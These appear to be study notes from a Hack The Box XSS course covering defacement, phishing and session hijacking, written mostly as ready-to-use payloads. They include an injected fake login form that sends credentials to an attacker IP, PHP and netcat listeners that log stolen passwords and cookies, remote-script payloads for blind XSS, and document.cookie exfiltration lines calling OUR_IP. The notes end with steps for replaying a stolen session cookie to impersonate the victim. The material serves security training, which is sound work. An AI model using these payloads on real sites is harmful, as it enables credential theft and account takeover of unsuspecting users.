## 1- Defacing

Defacing changes a page's appearance via injected JavaScript (usually stored XSS). It affects all visitors and is often used to display a message or image.

#### Defacement Elements

- Background color: `document.body.style.background`
- Background image: `document.body.background`
- Page title: `document.title`
- Page text/HTML: `element.innerHTML` / `document.getElementsByTagName('body')[0].innerHTML`

#### Changing Background
```html
<script>document.body.style.background = "#141d2b"</script>
```
```html
<script>document.body.background = "https://example.com/image.png"</script>
```
#### Changing Page Title
```html
<script>document.title = 'HackTheBox Academy'</script>
```

#### Changing Page Text
Change a specific element:
```javascript
document.getElementById("todo").innerHTML = "New Text";
```
jQuery:
```javascript
$("#todo").html("New Text");
```

Replace entire body (minified one-line example):
```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color:white">Cyber Security Training</h1><p style="color:white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px"></p></center>'</script>
```



---

## 2- Phishing
Phishing via XSS injects a fake login form into a trusted page so victims submit credentials to the attacker. Often done with reflected or stored XSS and paired with UI cleanup to make the form look legitimate.

#### XSS Discovery
Find a working XSS payload for the target input (URL param, image URL, etc.). Inspect how the input is reflected in the HTML to pick an injection vector. Verify payload execution in the browser.

### Login Form Injection
Inline HTML form (minified) to inject via XSS:
```html
<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
```

Write it to the page via JavaScript (document.write):
```javascript
'> <script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```
### Cleaning Up
Remove the original input element to make the fake form appear native:
```javascript
document.getElementById('urlform').remove();
```

Comment out trailing page bits to hide remnants:
```html
<!--
```

Combine into one payload:
```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.18:80><input type=username name=username placeholder=Username><input type=password name=password placeholder=Password><input type=submit name=submit value=Login></form>');document.getElementById('urlform').remove();</script><!--
```

### Credential Stealing
Simple listener (netcat) to view captured GET request:
```bash
sudo nc -lvnp 80
```

Better: PHP listener that logs credentials and redirects victim back:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
Replace OUR_IP / SERVER_IP with your listener IP.

Start PHP server in folder with index.php:
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
# create index.php with the PHP code above
sudo php -S 0.0.0.0:80
```


---
## 3- Session Hijacking

Session Hijacking steals a victim’s active session by obtaining their cookies through XSS, allowing attackers to impersonate the victim without knowing their credentials.
#### Blind XSS Detection

Blind XSS occurs when the vulnerable input is executed in a context we cannot directly see (e.g., admin-only pages). Typical targets:

- Contact forms
- Reviews
- User registration
- Support tickets
- HTTP headers (User-Agent)

We test by submitting data and monitoring for execution using a remote script that calls back to our server.

#### Remote Script Injection

Include a remote script in the input to detect Blind XSS:
```html
<script src="http://OUR_IP/script.js"></script>
```

To identify the exact field, append the field name:
```html
<script src="http://OUR_IP/username"></script>
```

Other payload variants:
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Start a listener to receive callbacks:
```bash
nc -lnvp 80
```

Test each input field (skip non-vulnerable ones like email/password). Once a request reaches our server, we identify the vulnerable field and working payload.

### Session Hijacking Exploit

Once the vulnerable field is found, we can exfiltrate cookies using JavaScript:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
# or
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Host this in `script.js` on your server:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Update the XSS payload to load this script:
```html
<script src=http://OUR_IP/script.js></script>
```
#### PHP Listener to Log Cookies

Create `index.php` to save cookies:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Run the PHP server:
```bash
sudo php -S 0.0.0.0:80
```

When the victim triggers the payload, requests are logged:
```text
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

`cookies.txt` contains a clean log:
```text
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```


####  using  NetCat (simple)
```bash
nc -lnvp 80 -k

# inject the full xss payload 
'><script>document.location="http://10.10.16.52:80/?c="+document.cookie;</script>
```


#### Using Stolen Cookies

Inject the cookie into the victim’s session:
1. Navigate to `/login.php`.
2. Open Developer Tools → Storage tab.
3. Add a new cookie:
    - **Name:** part before `=`
    - **Value:** part after `=`

Example:
```text
Name: cookie
Value: f904f93c949d19d870911bf8b05fe7b2
Path: /hijacking
```

4. Refresh the page → now logged in as the victim.